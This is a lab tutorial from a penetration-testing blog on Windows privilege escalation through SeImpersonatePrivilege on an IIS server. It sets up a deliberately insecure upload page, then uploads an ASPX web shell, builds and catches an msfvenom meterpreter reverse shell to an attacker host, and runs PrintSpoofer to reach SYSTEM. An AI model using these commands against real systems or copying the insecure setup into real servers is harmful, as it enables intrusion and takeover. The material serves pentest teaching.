<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Windows Privilege Escalation: SeImpersonatePrivilege</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/" rel="bookmark"><time class="entry-date published" datetime="2021-08-04T08:36:11+00:00">August 4, 2021</time><time class="updated" datetime="2025-05-14T16:22:43+00:00">May 14, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article on <strong data-start="199" data-end="254">Windows Privilege Escalation SeImpersonatePrivilege</strong>, we will be showcasing the process of creating a lab environment on an IIS Server running a Windows Server 2019 machine. After setting the IIS server, we will be focusing on the usage of the SeImpersontePrivilege or “Impersonate a Client After Authentication” User Right Privileges to elevate the access on the machine using different methods.</span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Table of Contents</span> </span></h3>
<ul>
<li><span style="color: #000000;"><strong>Introduction </strong></span></li>
<li><span style="color: #000000;"><strong>Lab Setup</strong></span>
<ul>
<li><span style="color: #000000;">IIS Installation</span></li>
<li><span style="color: #000000;">Adding the Upload Functionality</span></li>
<li><span style="color: #000000;">Changing Permissions</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation of IIS Server</strong></span></li>
<li><span style="color: #000000;"><strong>Elevating Privileges using PrintSpoofer </strong></span></li>
<li><span style="color: #000000;"><strong>Conclusion </strong></span></li>
</ul>
<h3><span style="color: #000000;"><span style="color: #800000;">Introduction</span> </span></h3>
<p><span style="color: #000000;">Talking about the SeImpersonatePrivilege (Impersonate a Client after Authentication), Microsoft introduced it in Windows 2000 SP4. The system assigns this privilege to users who are members of the Device’s Local Administrators Group and the Device’s Local Service Account. Moreover, apart from these users and groups, the following components also have this user right: Services initiated by the Service Control Manager and Component Object Model (COM) servers initiated by the COM infrastructure. Now that we know which types of users have the <strong data-start="1468" data-end="1494">SeImpersonatePrivilege</strong>, it’s time to understand what users gain with these privileges. Whenever a user receives the <strong data-start="1588" data-end="1614">SeImpersonatePrivilege</strong>, they are permitted to run programs on behalf of a client, thereby supporting <strong data-start="1693" data-end="1748">Windows Privilege Escalation SeImpersonatePrivilege</strong> scenarios.</span></p>
<p><span style="color: #000000;">Now that we have a certain understanding of the SeImpersontatePrivilege. Let’s dive into the Lab setup for now. We will discuss this as we proceed.</span></p>
<h3><span style="color: #800000;">Lab Setup</span></h3>
<p><span style="color: #000000;">As we learned from the Introduction that this kind of privilege is set on the users that are local administrators or have similar roles. So, to replicate the vulnerability, we will be using Window Server 2019 with AD.  As Microsoft patched the vulnerabilities, we will be using Build 17763 as shown in the image below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">systeminfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hEyVtVp8jxc/YQpG1n5fu_I/AAAAAAAAyFk/hY-RGt8D05kPQ6Rl8SiLenf0UBGo2r5ngCLcBGAsYHQ/s16000/1.png"/></span></p>
<h4><span style="color: #000000;">IIS Installation</span></h4>
<p><span style="color: #000000;">We will be getting the particular privilege by installing the IIS server on our machine. To configure the IIS server, we will need to open the Server Manager and Choose the Add roles and features from the QuickStart Menu as shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1g7WKf3nl1g/YQpLXTVqLZI/AAAAAAAAyFs/niMgNN8ybf0SiEuWjeWRPcnXOIoX42V8gCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">This will open an Installation Wizard. We move through the Before You Begin section without making any changes. Now we are presented with the Installation Type section, we will proceed to choose the Role-based or feature-based installation option.  </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nwScmdBuMgk/YQpLplS1O6I/AAAAAAAAyF0/VesdttgTupYObJgS--vs-YifHHKNxmyhQCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">Again, we are breezing through the Server Selection as this would be different for each user as it is based on the name you gave to your server and its subsequent Forest. We get to the Server Roles section. Here, we have the option to choose the Web Server (IIS) as demonstrated below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fSf04I2mZYA/YQpLwUvT4rI/AAAAAAAAyF4/BRq0YZJ-tzwukN_QjDHpJovT4dTCXvN5QCLcBGAsYHQ/s16000/4.png"/></span></p>
<h5><strong><span style="color: #000000;">Configuring IIS Features and Completing Installation</span></strong></h5>
<p><span style="color: #000000;">Pressing the next button will lead us to the Features Section. Here, we have to make sure that we have some dependencies that are required for the IIS to function properly. It includes .NET Framework 4.7; chances are it will be installed by default. But other than that we need to install the ASP .NET 4.7 and under the WCF Services, we have the HTTP Activation and the TCP Port Sharing. Again, if you have something that is already installed, it is fine to move on by clicking Next.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gXYLjPISz6E/YQpL2sLfKZI/AAAAAAAAyF8/-dhGzXjMFLkjdEkZpafZ1-lsKVAmPl24ACLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Now, we have the section that has the Role-based Services that we want to install. There will be some automatically selected apart from those we will be selecting the Web Server and its components containing the Common HTTP Features, Health and Diagnostics, Performance and Security components as shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-td_tZYIpwg4/YQpL7nLSnyI/AAAAAAAAyGE/fuE5fvko1wMyo88_gojVKcYCc2b--3bPACLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">At last, we have the Confirmation Section. Here, we can verify all the services and components that we want to install. You can move on to the installation by clicking the Install button.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-F3owB_yyT1I/YQpMGJ-8RtI/AAAAAAAAyGI/dpfoi-v3Lq849eS0ZMoaQJlmT9OgdwoTwCLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">The Installation process will run for a little bit and then you would have successfully installed the IIS Service. We can view the IIS Welcome Page by accessing the IP Address of the Server through a Web Browser of your choice. In case, you run into an issue, try restarting the IIS service or the Server Itself.  </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nxQP1_Js3bw/YQpMNXeyDkI/AAAAAAAAyGU/M5unZiR5TKEeC_2CFdY6P08w52i0SQkDgCLcBGAsYHQ/s16000/8.png"/></span></p>
<h4><span style="color: #000000;">Adding the Upload Functionality</span></h4>
<p><span style="color: #000000;">Similar to the /var/www/html from the Linux HTTP server, we have the equivalent inside the inetpub/wwwroot location. It will have the welcome page that we viewed on the Web Browser Earlier. At this stage, we want to add the Upload Functionality onto our IIS Server. To do this, we created some web pages and scripts. We won’t be explaining those in detail over here. But, in case you want to add those on your deployment, download the files from our <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/Ignitetechnologies/Windows-Privilege-Escalation-SeImpersontatePrivilege.git">GitHub Repository</a> </strong></span>and Extract those files inside the wwwroot directory in such a way that it replicates the image shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-foDRx5_UCFA/YQpMUEYgAtI/AAAAAAAAyGY/SGzHztw7dl4s1Z3Uwk1GRoBm-yLO7Uc2gCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">To access the CS.aspx on our ISS Server, we will be editing the iisstart HTML page. Upon opening the file, the first time, you will be looking at some comments and the Official Microsoft Links. We removed those data and added the static address of our server followed by the name of the aspx file. This will make our CS.aspx webpage accessible when we click on the Welcome Page that used to redirect to the Microsoft Home Page. We are doing this to make our application easily accessible.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-okMj6QaiPoo/YQpMdVQ8ebI/AAAAAAAAyGg/MSZitqIv45g-IN3WexEF_e3fjljDA1HNQCLcBGAsYHQ/s16000/10.png"/></span></p>
<h4><span style="color: #000000;">Changing Permissions</span></h4>
<p><span style="color: #000000;">The process of adding web pages with the Upload functionality doesn’t end here, we need to change the permission so that we can access the webpage and upload files. To change the permissions, we open the IIS Manager. Here on the right-hand side Menu, we have the Edit Permissions option as highlighted in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tUKKDEEIHxQ/YQpMmwvXZyI/AAAAAAAAyGo/MrFKRTnkP6saCa5YprW0dujnCRAsrRVHQCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">This will open the wwwroot Directory Permissions. Here, we are allowing the Users of the Domain Full Control with the Modify access of the wwwroot directory. However, there exists a more secure way of doing this by making a dedicated user for the management of the IIS Server and adding the restricted permissions for that particular user. However, in the interest of time and convenience, we are applying permission for all users.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_GiYFeHCk8w/YQpMvUA1a3I/AAAAAAAAyGs/PQyCGsR79T43x9ql1a6SP1HuI9f_R722gCLcBGAsYHQ/s16000/12.png"/></span></p>
<h3><span style="color: #800000;">Exploiting IIS Server</span></h3>
<p><span style="color: #000000;">Now that we have the IIS Server up and running. Although we must mention that in case your IIS Server is not working as expected, try restarting the IIS service or the Server itself. Moving on, to exploit the IIS Server, we have added the File Upload functionality. Moving onto our attacker machine i.e., Kali Machine. Here, we have the Kali machine also set up in the network in such a way that it is possible to access the IIS service through a Web Browser on Kali. We browse the File Upload functionality and upload ASP Command Shell that is located at /usr/share/webshells/aspx/cmdasp.aspx on the webpage as shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uhuIjryEh4E/YQpM23iPeOI/AAAAAAAAyG0/ZTLCc5zLNlkyssTGIu3JIdhyb1fmus4CACLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;">Clicking on the Upload button, we will have the file successfully uploaded. This is just a demonstration; real-life scenarios will have additional security and steps involved before uploading a shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ypocOSiEnkA/YQpM8Rle_qI/AAAAAAAAyG4/X_Vhv3cFTY0Mi3GERq4uKdXv9rmdMUM_gCLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">As per the programming of the files that provided the Upload functionality, it was managed that the uploaded files will be placed inside the Uploads directory. So, we can access the uploaded shell by browsing at /Uploads/cmdasp.aspx as shown in the image. Here we have a field that can be used to run commands on the target machine. We demonstrated this by running the net user command.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UrJmTY80pns/YQpNBW4ISxI/AAAAAAAAyHA/rZodBwvLMEAuSeGTjGwYxD9O6lNODZk2wCLcBGAsYHQ/s16000/15.png"/></span></p>
<h5><span style="color: #000000;">Gaining Meterpreter Shell and Enumerating Privileges</span></h5>
<p><span style="color: #000000;">Now that we have tested that we can upload a shell and execute commands, it’s time to exploit the system and gain a meterpreter on the target machine. This means that we will need to create a payload using the msfvenom or any other tool of your choice. We are naming our payload as shell.exe</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.2 lport=1234 -f exe &gt; shell.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BIvPDLY-pSA/YQpNLZmiOqI/AAAAAAAAyHE/XJ8gNLNxXwoPvzSQAzycvEj8biM3IJjUwCLcBGAsYHQ/s16000/16.png"/></span></p>
<p><span style="color: #000000;">After successfully creating the payload, we will upload the payload similarly as we did with the aspx shell earlier.  We can see that the executable payload has been successfully uploaded to the target machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uyZWAUhn65Y/YQpNQ_wVkuI/AAAAAAAAyHM/YXC1u9qnaeYzcFaymMSe51v_82QCZ-X2gCLcBGAsYHQ/s16000/17.png"/></span></p>
<p><span style="color: #000000;">Now to generate the meterpreter shell, we will need to execute the payload as well. Hence, we will use the aspx shell to browse the path of the uploaded executable shell.exe file as shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Da7RkbB4hiw/YQpNV9qe3II/AAAAAAAAyHU/ZnZwX5Qb2cAslQ_URe5lK0MhqY59wHWeACLcBGAsYHQ/s16000/18.png"/></span></p>
<p><span style="color: #000000;">Before Executing the payload, we will need to create a listener that will capture the meterpreter reverse shell generated from the payload. We will need to provide the same configurations that we used while crafting the payload using the msfvenom. Next, we will exploit the payload on the machine using the aspx shell and receive the meterpreter shell. Since we are focusing on the Privileges in this piece, we ran the getprivs command to get the privileges that are enabled on the target machine. We can see that the privilege in question is enabled on the target machine i.e., SeImpersontatePrivilege.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.2
set lport 1234
exploit
getprivs</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mmmXqwz4pjk/YQpNbHksEVI/AAAAAAAAyHc/AqbJuIffaKI8OUUj7RXuEnrY6iGfRFbZgCLcBGAsYHQ/s16000/19.png"/></span></p>
<p><span style="color: #000000;">Although you don’t need to rely on the Metepreter shell’s getprivs command. You can check for the enabled privilege can be checked with the help of the whoami command with the /priv option added to it as shown in the image below. We can see that the session that we gained through exploitation is for the user iisapppool.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell
whoami /priv
whoami</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RW7MQfH_ci8/YQpNgdr6lBI/AAAAAAAAyHg/zRD3rLKIv_cCLbVofijxtFzUzYadBF91ACLcBGAsYHQ/s16000/20.png"/></span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Elevating Privileges using PrintSpoofer</span> </span></h3>
<p><span style="color: #000000;">One of the key resources abused in the wild to exploit the privilege we are discussing is called <strong data-start="1862" data-end="1878">PrintSpoofer</strong>. You can get your hands on the source code and the ready-to-deploy executable from <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/itm4n/PrintSpoofer">GitHub</a></span></strong>.  Interestingly, this tool is relatively new; however, the technique it uses to elevate access is quite aged. To fully understand how this tool exploits the <strong data-start="2125" data-end="2151">SeImpersonatePrivilege</strong>, we will now dive deeper into the access that this <strong data-start="2203" data-end="2258">Windows Privilege Escalation SeImpersonatePrivilege</strong> provides.<br/>
</span></p>
<p><span style="color: #000000;">As we discussed in the introduction, this privilege allows users to create a process with another user’s access. Therefore, <strong data-start="2398" data-end="2414">PrintSpoofer</strong> exploits it to elevate access to the <strong data-start="2452" data-end="2468">NT Authority</strong> level. In the demonstration provided below, we first move into the Public directory because it has the required write permissions for uploading the <strong data-start="2617" data-end="2633">PrintSpoofer</strong> executable. Then, after uploading the executable, we move to the command shell on the target machine. After listing the contents, we can confirm that the transfer of the <strong data-start="2804" data-end="2820">PrintSpoofer</strong> executable was successful.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gFwKgxTYB-I/YQpNlBCG1_I/AAAAAAAAyHo/sZm_PAFahH4pDi8loDcj1lJGwaVXaVPawCLcBGAsYHQ/s16000/21.png"/></span></p>
<p><span style="color: #000000;">Using the <strong data-start="2929" data-end="2945">PrintSpoofer</strong> exploit is quite straightforward. You need two parameters: -i to request an interactive session and -c to specify the access level after exploitation. When we run this command on the target machine, it searches for the <strong data-start="3185" data-end="3211">SeImpersonatePrivilege</strong> and checks for a Named Pipe. After successfully completing these checks, it proceeds with the creation of the process specified by the -c option using the NT Authority token. Finally, we observe that a new command shell instance is generated. When we run the whoami command, it shows that we have successfully achieved <strong data-start="3535" data-end="3590">Windows Privilege Escalation SeImpersonatePrivilege</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">PrintSpoofer64.exe -i -c cmd
whoami</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FRK1DtDKQSo/YQpNtUzuGEI/AAAAAAAAyH0/v8fkAz1FM1wBT87dNf1f_5Nz_lVTblaLwCLcBGAsYHQ/s16000/22.png"/></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">During the research process, it became apparent that although many guides exist to use various tools to exploit the <strong>SeImpersonatePrivilege</strong> on the machine, there isn’t a single resource that shows how to set these privileges in the first place. Therefore, I hope that this article will help you grasp the concept of <strong>Windows Privilege Escalation using SeImpersonatePrivilege</strong>. It will also explain the methodology behind the exploitation of <strong>SeImpersonatePrivilege</strong>.</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on</span> <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
